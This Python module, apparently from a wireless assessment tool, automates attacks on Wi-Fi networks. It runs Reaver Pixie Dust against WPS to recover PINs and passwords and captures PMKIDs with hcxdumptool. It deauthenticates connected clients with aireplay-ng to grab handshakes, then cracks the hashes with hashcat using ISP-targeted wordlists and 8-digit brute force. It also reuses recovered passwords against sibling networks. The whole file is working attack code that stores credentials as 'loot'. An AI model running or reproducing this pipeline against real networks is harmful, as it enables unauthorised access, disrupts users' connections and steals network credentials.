from __future__ import annotations

import csv
import json
import logging
import re
import shutil
import subprocess
import tempfile
import time
from pathlib import Path

from core.config import DEFAULT_WORDLIST, ISP_WORDLIST, TIMEOUTS
from core.models import AssessmentContext, DualBandResult, WifiNetwork
from core.workspace_manager import WorkspaceManager

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Pure parsers
# ---------------------------------------------------------------------------

def parse_reaver_output(output: str) -> dict[str, str] | None:
    pin_match = re.search(r"WPS PIN: '(\d+)'", output)
    psk_match = re.search(r"WPA PSK: '([^']+)'", output)
    if psk_match:
        return {
            "pin": pin_match.group(1) if pin_match else "Unknown",
            "psk": psk_match.group(1),
        }
    return None


def parse_hashcat_potfile(potfile_path: Path) -> str | None:
    if not potfile_path.exists() or potfile_path.stat().st_size == 0:
        return None
    lines = [line for line in potfile_path.read_text(errors="ignore").splitlines() if line.strip()]
    for line in reversed(lines):
        if ":" in line:
            return line.rsplit(":", 1)[-1]
    return None


def parse_wash_output(output: str, bssid: str) -> bool:
    """Return True when wash output lists the target BSSID as WPS-capable."""
    target = bssid.lower()
    for line in output.splitlines():
        if target in line.lower():
            return True
    return False


def parse_airodump_clients(csv_path: Path, bssid: str) -> list[str]:
    """Extract associated client MACs for a BSSID from an airodump-ng CSV file."""
    if not csv_path.exists() or csv_path.stat().st_size == 0:
        return []

    clients: list[str] = []
    in_clients_section = False
    target = bssid.upper()

    with csv_path.open(newline="", encoding="utf-8", errors="ignore") as handle:
        for row in csv.reader(handle):
            if not row:
                continue
            first_cell = row[0].strip()
            if first_cell == "Station MAC":
                in_clients_section = True
                continue
            if not in_clients_section or len(row) < 6:
                continue

            mac = row[0].strip()
            associated_bssid = row[5].strip().upper()
            if associated_bssid == target and mac:
                clients.append(mac)

    return sorted(set(clients))


def _subprocess_text(value: str | bytes | None) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="ignore")
    return value


def _cmd_available(name: str) -> bool:
    return shutil.which(name) is not None


def _log_tool(ws: WorkspaceManager | None, name: str, cmd: list[str], out: str) -> None:
    if ws is not None:
        ws.append_tool_log(name, " ".join(cmd), out)


# ---------------------------------------------------------------------------
# Wordlist resolution
# ---------------------------------------------------------------------------

def resolve_wordlist(
    target: WifiNetwork,
    workspace_manager: WorkspaceManager,
    wordlist_override: Path | None = None,
) -> Path | None:
    if wordlist_override is not None:
        if wordlist_override.exists():
            log.info("Using caller-supplied wordlist: %s", wordlist_override)
            return wordlist_override
        log.warning("Supplied wordlist not found: %s", wordlist_override)

    ssid_upper = target.ssid.upper()
    if (
        any(k in ssid_upper for k in ("MOVISTAR", "VODAFONE", "ORANGE", "JAZZTEL", "LIVEBOX"))
        and ISP_WORDLIST.exists()
    ):
        log.info("ISP pattern detected; using ISP wordlist: %s", ISP_WORDLIST.name)
        return ISP_WORDLIST

    local_dir = Path("wordlists")
    if local_dir.is_dir():
        candidates = sorted(local_dir.glob("*.txt")) + sorted(local_dir.glob("*.lst"))
        if candidates:
            log.info("Using wordlist from ./wordlists/: %s", candidates[0].name)
            return candidates[0]

    if DEFAULT_WORDLIST.exists():
        return DEFAULT_WORDLIST

    gz_path = Path(f"{DEFAULT_WORDLIST}.gz")
    if gz_path.exists():
        local_copy = workspace_manager.get_path("rockyou_local")
        if not local_copy.exists():
            log.info("Extracting %s into workspace...", gz_path.name)
            try:
                with local_copy.open("w") as out_f:
                    subprocess.run(["zcat", str(gz_path)], stdout=out_f, check=True)
            except (subprocess.SubprocessError, OSError) as exc:
                log.warning("Could not extract wordlist: %s", exc)
                return None
        return local_copy

    log.warning("No wordlist found. Skipping dictionary phase.")
    return None


# ---------------------------------------------------------------------------
# WPS detection and Pixie Dust
# ---------------------------------------------------------------------------

def detect_wps_with_wash(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
) -> bool:
    """Use wash to confirm WPS exposure even when nmcli does not advertise it."""
    if not _cmd_available("wash"):
        log.warning("wash is not installed; hidden WPS detection skipped.")
        workspace_manager.save_metadata("wash_available", False)
        return False

    command_variants = [
        ["wash", "-i", interface, "-c", channel, "-s"],
        ["wash", "-i", interface],
    ]
    for command in command_variants:
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=TIMEOUTS["wash_scan"],
            )
        except subprocess.TimeoutExpired as exc:
            output = _subprocess_text(exc.stdout) + _subprocess_text(exc.stderr)
        except (subprocess.SubprocessError, OSError) as exc:
            workspace_manager.save_metadata("wash_error", str(exc))
            continue
        else:
            output = result.stdout + result.stderr

        _log_tool(workspace_manager, "wash", command, output)
        detected = parse_wash_output(output, bssid)
        if detected:
            workspace_manager.save_metadata("wash_available", True)
            workspace_manager.save_metadata("hidden_wps_detected", True)
            log.info("wash detected WPS exposure for %s.", bssid)
            return True

    workspace_manager.save_metadata("wash_available", True)
    workspace_manager.save_metadata("hidden_wps_detected", False)
    log.info("wash did not report WPS exposure for %s.", bssid)
    return False


def run_wps_pixie(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> dict[str, str] | None:
    loot_file = workspace_manager.get_path("wps_loot")
    if loot_file.exists():
        log.info("Previous WPS run detected; reusing stored results.")
        if captured_files is not None:
            captured_files["wps_loot"] = loot_file
        try:
            return json.loads(loot_file.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            log.warning("WPS_LOOT.json corrupted; re-running.")

    log.info("Starting WPS Pixie Dust (Reaver) against %s...", bssid)
    command = ["reaver", "-i", interface, "-b", bssid, "-c", channel, "-K", "1", "-L", "-vv"]
    try:
        result = subprocess.run(
            command, capture_output=True, text=True, timeout=TIMEOUTS["wps_pixie"],
        )
        _log_tool(workspace_manager, "reaver", command, result.stdout + result.stderr)
        parsed = parse_reaver_output(result.stdout + result.stderr)
        if parsed:
            log.info("WPS material recovered. PIN: %s | PSK: %s", parsed["pin"], parsed["psk"])
            loot_file.write_text(json.dumps(parsed, indent=4), encoding="utf-8")
            workspace_manager.save_metadata("wps_success", True)
            workspace_manager.save_metadata("wps_loot_file", str(loot_file))
            if captured_files is not None:
                captured_files["wps_loot"] = loot_file
            return parsed
        log.warning("Pixie Dust unsuccessful (router may be patched).")
        workspace_manager.save_metadata("wps_success", False)
        return None
    except subprocess.TimeoutExpired:
        log.warning("WPS timeout (%ds). Aborting.", TIMEOUTS["wps_pixie"])
        workspace_manager.save_metadata("wps_timeout", True)
        return None
    except (subprocess.SubprocessError, OSError) as exc:
        log.error("Reaver error: %s", exc)
        return None


# ---------------------------------------------------------------------------
# PMKID capture
# ---------------------------------------------------------------------------

def collect_pmkid(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    pcapng_file = workspace_manager.get_path("pmkid")
    if pcapng_file.exists() and pcapng_file.stat().st_size > 0:
        log.info("Previous PMKID capture found; reusing.")
        if captured_files is not None:
            captured_files["pmkid_capture"] = pcapng_file
        return pcapng_file

    log.info("Attempting passive PMKID capture against %s...", bssid)
    filter_file = workspace_manager.get_path("target_filter")
    filter_file.write_text(f"{bssid.replace(':', '')}\n")

    command = [
        "hcxdumptool", "-i", interface, "-c", channel,
        f"--filterlist_ap={filter_file}", "--filtermode=2",
        "-o", str(pcapng_file), "--enable_status=1",
    ]
    process = None
    try:
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(TIMEOUTS["pmkid_capture"])
        if pcapng_file.exists() and pcapng_file.stat().st_size > 0:
            log.info("PMKID capture finished: %s", pcapng_file.name)
            workspace_manager.save_metadata("pmkid_capture", str(pcapng_file))
            if captured_files is not None:
                captured_files["pmkid_capture"] = pcapng_file
            return pcapng_file
        log.warning("Capture window ended without valid PMKID material.")
        return None
    except (subprocess.SubprocessError, OSError) as exc:
        log.error("hcxdumptool error: %s", exc)
        return None
    finally:
        if process and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
        _log_tool(workspace_manager, "hcxdumptool", command, f"Output: {pcapng_file}")


# ---------------------------------------------------------------------------
# EAPOL capture with client detection
# ---------------------------------------------------------------------------

def detect_clients(
    interface: str,
    bssid: str,
    channel: str,
    listen_seconds: int = 8,
) -> list[str]:
    """Run airodump-ng briefly to detect associated client MACs for a BSSID."""
    if not _cmd_available("airodump-ng"):
        return []

    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = Path(tmpdir) / "clients"
        command = [
            "airodump-ng", "--bssid", bssid,
            "--channel", channel,
            "-w", str(prefix), "--output-format", "csv",
            interface,
        ]
        process = None
        try:
            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(listen_seconds)
        except (subprocess.SubprocessError, OSError):
            return []
        finally:
            if process and process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    process.kill()

        return parse_airodump_clients(Path(f"{prefix}-01.csv"), bssid)


def detect_associated_clients(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
) -> list[str]:
    """Compatibility wrapper that records client detection metadata."""
    clients = detect_clients(
        interface,
        bssid,
        channel,
        listen_seconds=TIMEOUTS.get("client_scan", 8),
    )
    workspace_manager.save_metadata("detected_clients", clients)
    workspace_manager.save_metadata("associated_clients", clients)
    workspace_manager.save_metadata("associated_clients_count", len(clients))
    return clients


def capture_eapol(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    capture_prefix = workspace_manager.get_path("eapol_prefix")
    capture_file = Path(f"{capture_prefix}-01.cap")

    if capture_file.exists() and capture_file.stat().st_size > 0:
        log.info("Previous EAPOL capture found; reusing.")
        if captured_files is not None:
            captured_files["eapol_capture"] = capture_file
        return capture_file

    log.info("Checking for associated clients before deauth...")
    clients = detect_associated_clients(interface, bssid, channel, workspace_manager)
    if clients:
        log.info("Found %d client(s): %s", len(clients), ", ".join(clients))
    else:
        log.warning("No clients detected on %s. Skipping deauthentication.", bssid)
        workspace_manager.save_metadata("deauth_skipped", True)
        workspace_manager.save_metadata("deauth_skip_reason", "no_associated_clients")
        return None

    log.info("Starting EAPOL capture (deauth path) against %s...", bssid)
    airodump_cmd = [
        "airodump-ng", "--bssid", bssid, "--channel", channel,
        "-w", str(capture_prefix), "--output-format", "pcap", interface,
    ]
    deauth_targets = clients[:3]

    airodump_proc = None
    try:
        airodump_proc = subprocess.Popen(
            airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)

        for client_mac in deauth_targets:
            deauth_cmd = ["aireplay-ng", "--deauth", "15", "-a", bssid, "-c", client_mac, interface]
            log.info("Deauthenticating client %s...", client_mac)
            try:
                deauth_res = subprocess.run(
                    deauth_cmd, capture_output=True, text=True,
                    timeout=TIMEOUTS["eapol_deauth"],
                )
                _log_tool(workspace_manager, "aireplay-ng", deauth_cmd, deauth_res.stdout + deauth_res.stderr)
            except subprocess.TimeoutExpired:
                log.warning("Deauth timed out for %s.", client_mac)

        log.info("Waiting %ds for client reconnection...", TIMEOUTS["eapol_listen"])
        time.sleep(TIMEOUTS["eapol_listen"])

        if capture_file.exists() and capture_file.stat().st_size > 0:
            log.info("EAPOL capture finished: %s", capture_file.name)
            workspace_manager.save_metadata("eapol_capture", str(capture_file))
            if captured_files is not None:
                captured_files["eapol_capture"] = capture_file
            return capture_file

        log.warning("EAPOL capture file not created or empty.")
        return None

    except (subprocess.SubprocessError, OSError) as exc:
        log.error("EAPOL capture error: %s", exc)
        return None
    finally:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_proc.kill()
        _log_tool(workspace_manager, "airodump-ng", airodump_cmd, f"Output: {capture_file}")


# ---------------------------------------------------------------------------
# Hash preparation
# ---------------------------------------------------------------------------

def prepare_hash_file(
    capture_file: Path,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    hash_file = workspace_manager.get_path("hash")
    if hash_file.exists() and hash_file.stat().st_size > 0:
        log.info("Existing 22000 hash file found; reusing.")
        if captured_files is not None:
            captured_files["hash_file"] = hash_file
        return hash_file

    log.info("Processing capture with hcxpcapngtool...")
    command = ["hcxpcapngtool", "-o", str(hash_file), str(capture_file)]
    try:
        result = subprocess.run(
            command, capture_output=True, text=True,
            timeout=TIMEOUTS["hash_prep"], check=True,
        )
        _log_tool(workspace_manager, "hcxpcapngtool", command, result.stdout + result.stderr)
        if hash_file.exists() and hash_file.stat().st_size > 0:
            log.info("Hash saved: %s", hash_file.name)
            workspace_manager.save_metadata("hash_file", str(hash_file))
            if captured_files is not None:
                captured_files["hash_file"] = hash_file
            return hash_file
        log.warning("Capture processed but no valid material found.")
        return None
    except subprocess.CalledProcessError as exc:
        _log_tool(workspace_manager, "hcxpcapngtool", command, exc.stdout + exc.stderr)
        log.error("hcxpcapngtool failed: %s", exc.stderr.strip())
        return None
    except (subprocess.TimeoutExpired, OSError) as exc:
        log.error("Hash prep error: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Hashcat
# ---------------------------------------------------------------------------

def run_hashcat(
    hash_file: Path,
    target: WifiNetwork,
    workspace_manager: WorkspaceManager,
    context: AssessmentContext,
    captured_files: dict[str, Path] | None = None,
    wordlist_override: Path | None = None,
) -> str | None:
    log.info("Starting Hashcat pipeline...")
    potfile = workspace_manager.get_path("potfile")

    cracked = parse_hashcat_potfile(potfile)
    if cracked:
        log.info("Previously recovered password reused: %s", cracked)
        if captured_files is not None and potfile.exists():
            captured_files["potfile"] = potfile
        return cracked

    if "crack" not in context.offensive_requests and "auto" not in context.offensive_requests:
        log.warning("Cracking phase skipped (not in offensive_requests).")
        return None

    if captured_files is not None and hash_file.exists():
        captured_files["hash_file"] = hash_file

    wordlist_path = resolve_wordlist(target, workspace_manager, wordlist_override)
    if wordlist_path is not None:
        log.info("Hashcat dictionary attack; wordlist: %s", wordlist_path.name)
        cmd_dict = [
            "hashcat", "-m", "22000", str(hash_file), str(wordlist_path),
            "--potfile-path", str(potfile), "-O", "-w", "3",
        ]
        try:
            res = subprocess.run(cmd_dict, capture_output=True, text=True)
            _log_tool(workspace_manager, "hashcat-dict", cmd_dict, res.stdout + res.stderr)
            if res.returncode > 1:
                log.error("Hashcat critical error (dict): %s", res.stderr.strip())
        except KeyboardInterrupt:
            log.warning("Hashcat interrupted.")

        cracked = parse_hashcat_potfile(potfile)
        if cracked:
            log.info("Password recovered via dictionary: %s", cracked)
            if captured_files is not None and potfile.exists():
                captured_files["potfile"] = potfile
            return cracked

    log.info("Falling back to 8-digit numeric brute-force...")
    cmd_brute = [
        "hashcat", "-m", "22000", str(hash_file), "-a", "3", "?d?d?d?d?d?d?d?d",
        "--potfile-path", str(potfile), "-O", "-w", "3",
    ]
    try:
        res_brute = subprocess.run(cmd_brute, capture_output=True, text=True)
        _log_tool(workspace_manager, "hashcat-brute", cmd_brute, res_brute.stdout + res_brute.stderr)
        if res_brute.returncode > 1:
            log.error("Hashcat critical error (brute): %s", res_brute.stderr.strip())
    except KeyboardInterrupt:
        log.warning("Brute-force interrupted.")

    cracked = parse_hashcat_potfile(potfile)
    if cracked:
        log.info("Password recovered via brute-force: %s", cracked)
        if captured_files is not None and potfile.exists():
            captured_files["potfile"] = potfile
        return cracked

    log.error("Cracking module completed without success.")
    return None


# ---------------------------------------------------------------------------
# Dual-band PSK parity check
# ---------------------------------------------------------------------------

def verify_dual_band_psk(
    sibling: WifiNetwork,
    known_password: str,
    interface: str,
    workspace_manager: WorkspaceManager,
    attack_log: list[str] | None = None,
) -> DualBandResult:
    """
    Verify whether the sibling network uses the recovered PSK.

    This expects interface to already be in a mode suitable for PMKID capture.
    """
    log.info(
        "[dual-band] Checking sibling %s (%s, %s)...",
        sibling.display_name, sibling.bssid, sibling.band,
    )
    if attack_log is not None:
        attack_log.append(
            f"Dual-band check: probing sibling {sibling.display_name} ({sibling.band})"
        )

    sibling_ws = WorkspaceManager(
        workspace_manager.workspace_path.parent,
        sibling.bssid + "_sibling",
    )

    pcapng = collect_pmkid(
        interface=interface,
        bssid=sibling.bssid,
        channel=sibling.channel,
        workspace_manager=sibling_ws,
    )
    if pcapng is None:
        note = "PMKID capture against sibling produced no material; PSK parity inconclusive."
        log.warning("[dual-band] %s", note)
        if attack_log is not None:
            attack_log.append(f"Dual-band: {note}")
        return DualBandResult(sibling=sibling, same_password=None, method="pmkid", note=note)

    hash_file = prepare_hash_file(pcapng, sibling_ws)
    if hash_file is None:
        note = "Hash conversion failed for sibling capture; PSK parity inconclusive."
        log.warning("[dual-band] %s", note)
        if attack_log is not None:
            attack_log.append(f"Dual-band: {note}")
        return DualBandResult(sibling=sibling, same_password=None, method="pmkid+hashcat", note=note)

    single_wl = sibling_ws.workspace_path / "single_password.txt"
    single_wl.write_text(known_password + "\n", encoding="utf-8")

    potfile = sibling_ws.workspace_path / "sibling.potfile"
    cmd = [
        "hashcat", "-m", "22000", str(hash_file), str(single_wl),
        "--potfile-path", str(potfile), "-O", "-w", "1",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        _log_tool(sibling_ws, "hashcat-dual-band", cmd, result.stdout + result.stderr)
    except (subprocess.SubprocessError, subprocess.TimeoutExpired, OSError) as exc:
        log.warning("[dual-band] hashcat error: %s", exc)
        _log_tool(sibling_ws, "hashcat-dual-band", cmd, str(exc))

    cracked = parse_hashcat_potfile(potfile)
    if cracked == known_password:
        note = f"Sibling {sibling.display_name} ({sibling.band}) confirmed the same PSK."
        log.info("[dual-band] %s", note)
        if attack_log is not None:
            attack_log.append(f"Dual-band CONFIRMED: {note}")
        return DualBandResult(sibling=sibling, same_password=True, method="pmkid+hashcat", note=note)

    note = (
        f"Sibling {sibling.display_name} ({sibling.band}) did not match the recovered PSK, "
        "or the captured material was not sufficient."
    )
    log.info("[dual-band] %s", note)
    if attack_log is not None:
        attack_log.append(f"Dual-band DIFFERENT/INCONCLUSIVE: {note}")
    return DualBandResult(sibling=sibling, same_password=False, method="pmkid+hashcat", note=note)
